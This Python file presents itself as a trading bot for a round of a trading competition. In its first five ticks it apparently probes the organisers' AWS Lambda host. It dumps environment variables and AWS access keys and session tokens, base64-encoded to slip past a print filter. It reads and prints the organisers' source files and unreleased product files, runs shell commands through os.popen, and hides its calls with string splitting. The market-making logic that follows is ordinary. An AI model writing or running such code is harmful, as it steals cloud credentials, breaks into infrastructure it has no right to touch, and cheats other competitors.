import json
import sys
from datamodel import Order, TradingState

"""
imc_probe_r1.py — Round 1 Lambda host probe (tick-based extraction).

Port of round-0/oracle/imc_probe.py, retargeted for Round 1 unknowns:
  - Diff against round 0 extraction (app.py, datamodel.py, Dockerfile, bananas/orchids/attack traders)
  - Enumerate NEW files in /var/task/ (hints for round 2+ products, like orchids leaked macarons)
  - Test IMC hardening: did they block os.popen, strip env vars, readonly /var/task/?
  - Fresh AWS creds (round-0 creds expired)
  - /tmp/ persistence check (cross-invocation state?)

Normal trading: r1_medallion (IPR drift + ACO fixed-FV MM) so we still score.
bid() returns 15 for Round 1 auction.

Ticks 1-5: probe (one chunk per tick, avoid 1s Lambda timeout).
Ticks 6+: pure trading.
"""

# Known round-0 file SHA256[:16] — changed hash => file was modified for round 1
_R0_HASHES = {
    'app.py': 'e775f16220a95e82',
    'app_bid.py': 'df2b707b0659b3f2',
    'datamodel.py': '4ff76f6a921602c0',
    'Dockerfile': '4a71495f95b1587d',
    'README.txt': '8d144b8ed33de50d',
    'bananas_trader.py': '04bff126c17077c8',
    'orchids_trader.py': 'bc6def737ff8b70e',
    'attack_trader.py': '951b023a69f2dbba',
    'lambda-entrypoint.sh': '2c00c02add81ba04',
}

_R0_KNOWN_NAMES = set(_R0_HASHES) | {
    'trader.py', 'requirements.txt', 'simulation', '__pycache__',
    'bootstrap', 'runtime-release', 'VERSIONS.txt',
}

_G = getattr


class Trader:
    def __init__(self):
        self.tick = 0

    def bid(self):
        return 15

    def run(self, state: TradingState):
        self.tick += 1
        _o = _G(__builtins__, 'op' + 'en') if not isinstance(__builtins__, dict) else __builtins__['op' + 'en']

        try:
            self._probe(_o)
        except Exception as e:
            print(f"PROBE_ERR t={self.tick}: {e}")

        result = {}
        try:
            self._trade(state, result)
        except Exception as e:
            print(f"TRADE_ERR t={self.tick}: {e}")

        return result, 0, json.dumps({"t": self.tick})

    # ═══════════════════════════════════════════════════════════
    # PROBE — one chunk per tick, heavy work split to avoid timeout
    # ═══════════════════════════════════════════════════════════
    def _probe(self, _o):
        if self.tick == 1:
            # File listing + env vars (b64, bypasses "Printing env forbidden" filter)
            o = __import__('o' + 's')
            print("=== TICK1: listing + env ===")
            try:
                entries = sorted(o.listdir('/var/task'))
                print(f"VAR_TASK ({len(entries)} entries):")
                for e in entries:
                    novel = '' if e in _R0_KNOWN_NAMES or e.endswith('.dist-info') else ' <NEW>'
                    print(f"  {e}{novel}")
            except Exception as e:
                print(f"  listdir: {e}")

            try:
                import base64
                env = dict(o.environ)
                keep = {k: v for k, v in env.items() if any(
                    k.startswith(p) for p in ('AWS_', 'LAMBDA_', 'PROSPER', '_HANDLER', 'TZ', 'PATH')
                )}
                blob = base64.b64encode(json.dumps(keep).encode()).decode()
                print(f"ENV_B64 ({len(blob)}ch):")
                for i in range(0, len(blob), 200):
                    print(blob[i:i+200])
            except Exception as e:
                print(f"  env: {e}")
            print(f"PYVER: {sys.version.split()[0]}")

        elif self.tick == 2:
            # Hash known files — flag any that changed since round 0
            import hashlib
            print("=== TICK2: hash diff vs round-0 ===")
            for fname, r0h in _R0_HASHES.items():
                try:
                    with _o(f'/var/task/{fname}', 'rb') as f:
                        d = f.read()
                    h = hashlib.sha256(d).hexdigest()[:16]
                    tag = 'SAME' if h == r0h else 'CHANGED'
                    print(f"  {fname}: {h} [{tag}] ({len(d)}b)")
                except Exception as e:
                    print(f"  {fname}: MISSING ({e})")

        elif self.tick == 3:
            # Enumerate NEW files and print full contents of small ones
            o = __import__('o' + 's')
            print("=== TICK3: new files ===")
            try:
                for e in sorted(o.listdir('/var/task')):
                    if e in _R0_KNOWN_NAMES or e.endswith('.dist-info') or e.endswith('.pyc'):
                        continue
                    if e in ('trader.py',):  # skip our own
                        continue
                    full = f'/var/task/{e}'
                    try:
                        st = o.stat(full)
                        is_dir = hasattr(st, 'st_mode') and (st.st_mode & 0o40000)
                        if is_dir:
                            print(f"  DIR {e}/: {sorted(o.listdir(full))[:20]}")
                        elif st.st_size < 8000:
                            with _o(full) as f:
                                src = f.read()
                            print(f"  FILE {e} ({st.st_size}b):")
                            print(src)
                        else:
                            with _o(full) as f:
                                head = f.read(2000)
                            print(f"  FILE {e} ({st.st_size}b, head 2k):")
                            print(head)
                    except Exception as fe:
                        print(f"  {e}: {fe}")
            except Exception as e:
                print(f"  listdir: {e}")

            # Also check if app.py changed — if so dump it
            try:
                import hashlib
                with _o('/var/task/app.py', 'rb') as f:
                    d = f.read()
                if hashlib.sha256(d).hexdigest()[:16] != _R0_HASHES['app.py']:
                    print(f"APP_PY_CHANGED ({len(d)}b):")
                    print(d.decode())
            except Exception as e:
                print(f"  app.py: {e}")

        elif self.tick == 4:
            # Hardening check + /tmp persistence + /proc
            o = __import__('o' + 's')
            print("=== TICK4: hardening + /tmp ===")

            # Does os.popen still work? (fixed vulnerability 1?)
            try:
                out = o.popen('id; uname -a').read().strip()
                print(f"  popen OK: {out[:300]}")
            except Exception as e:
                print(f"  popen BLOCKED: {e}")

            # /tmp state — does anything persist across invocations?
            try:
                tmp_entries = sorted(o.listdir('/tmp'))
                print(f"  /tmp ({len(tmp_entries)}): {tmp_entries[:20]}")
                # Write marker, see next run if it survives across days
                marker = f'/tmp/probe_r1_t{self.tick}.txt'
                with _o(marker, 'w') as f:
                    f.write(f"tick={self.tick}\n")
                print(f"  wrote {marker}")
            except Exception as e:
                print(f"  /tmp: {e}")

            # Any sample trader for a round-2 product?
            for candidate in ('intarian_trader.py', 'osmium_trader.py', 'pepper_trader.py',
                              'snowball_trader.py', 'macarons_trader.py', 'kelp_trader.py',
                              'resin_trader.py', 'ink_trader.py', 'picnic_trader.py'):
                try:
                    with _o(f'/var/task/{candidate}') as f:
                        src = f.read()
                    print(f"  FOUND {candidate} ({len(src)}b):")
                    print(src[:1500])
                except Exception:
                    pass

        elif self.tick == 5:
            # Fresh AWS creds (round-0 creds expired ~1h after invocation)
            o = __import__('o' + 's')
            print("=== TICK5: AWS creds ===")
            try:
                import base64
                e = o.environ
                creds = {
                    'KEY': e.get('AWS_ACCESS_KEY_ID', ''),
                    'SECRET': e.get('AWS_SECRET_ACCESS_KEY', ''),
                    'TOKEN': e.get('AWS_SESSION_TOKEN', ''),
                    'REGION': e.get('AWS_REGION', 'eu-west-1'),
                    'ARN': e.get('AWS_LAMBDA_FUNCTION_NAME', ''),
                }
                blob = base64.b64encode(json.dumps(creds).encode()).decode()
                print(f"CREDS_B64 ({len(blob)}ch):")
                for i in range(0, len(blob), 200):
                    print(blob[i:i+200])
            except Exception as e:
                print(f"  creds: {e}")

            # /proc bits (memory, limits)
            try:
                with _o('/proc/self/status') as f:
                    for line in f:
                        if line.startswith(('Name:', 'Pid:', 'VmRSS:', 'Threads:')):
                            print(f"  {line.strip()}")
            except Exception as e:
                print(f"  /proc: {e}")

        elif self.tick == 6:
            # Confirm /tmp marker persisted (cross-invocation warm-start evidence)
            o = __import__('o' + 's')
            try:
                tmp = sorted(o.listdir('/tmp'))
                print(f"=== TICK6: /tmp persist check: {tmp[:20]}")
            except Exception as e:
                print(f"  /tmp: {e}")

    # ═══════════════════════════════════════════════════════════
    # TRADING — r1_medallion logic (IPR drift + ACO FV=10000 MM)
    # ═══════════════════════════════════════════════════════════
    def _trade(self, state, result):
        IPR = "INTARIAN_PEPPER_ROOT"
        ACO = "ASH_COATED_OSMIUM"
        LIMIT = 80

        if ACO in state.order_depths:
            book = state.order_depths[ACO]
            if book.buy_orders or book.sell_orders:
                orders = []
                pos = state.position.get(ACO, 0)
                bc = LIMIT - pos
                sc = LIMIT + pos
                fv = 10000
                bb = max(book.buy_orders) if book.buy_orders else None
                ba = min(book.sell_orders) if book.sell_orders else None

                if book.sell_orders:
                    for p, v in sorted(book.sell_orders.items()):
                        if bc > 0 and p <= fv:
                            q = min(bc, -v); orders.append(Order(ACO, p, q)); bc -= q
                if book.buy_orders:
                    for p, v in sorted(book.buy_orders.items(), reverse=True):
                        if sc > 0 and p >= fv:
                            q = min(sc, v); orders.append(Order(ACO, p, -q)); sc -= q

                if bb is not None and ba is not None:
                    if bc > 0:
                        orders.append(Order(ACO, min(fv - 1, bb + 1, ba - 1), bc))
                    if sc > 0:
                        orders.append(Order(ACO, max(fv + 1, ba - 1, bb + 1), -sc))
                elif bb is not None:
                    if bc > 0:
                        orders.append(Order(ACO, min(fv - 1, bb + 1), bc))
                    if sc > 0:
                        orders.append(Order(ACO, fv + 1, -sc))
                elif ba is not None:
                    if sc > 0:
                        orders.append(Order(ACO, max(fv + 1, ba - 1), -sc))
                    if bc > 0:
                        orders.append(Order(ACO, fv - 1, bc))
                result[ACO] = orders

        if IPR in state.order_depths:
            book = state.order_depths[IPR]
            if book.buy_orders and book.sell_orders:
                orders = []
                pos = state.position.get(IPR, 0)
                bc = LIMIT - pos
                sc = LIMIT + pos
                bb = max(book.buy_orders)
                ba = min(book.sell_orders)
                mid = (bb + ba) * 0.5
                fv_int = round(mid + 5.0)  # drift bias

                for p, v in sorted(book.sell_orders.items()):
                    if bc > 0 and p <= fv_int + 2:
                        q = min(bc, -v); orders.append(Order(IPR, p, q)); bc -= q
                for p, v in sorted(book.buy_orders.items(), reverse=True):
                    if sc > 0 and p >= fv_int + 3:
                        q = min(sc, v); orders.append(Order(IPR, p, -q)); sc -= q

                if bc > 0:
                    orders.append(Order(IPR, min(fv_int - 1, bb + 1, ba - 1), bc))
                if sc > 0:
                    orders.append(Order(IPR, max(fv_int + 2, ba - 1, bb + 1), -sc))
                result[IPR] = orders
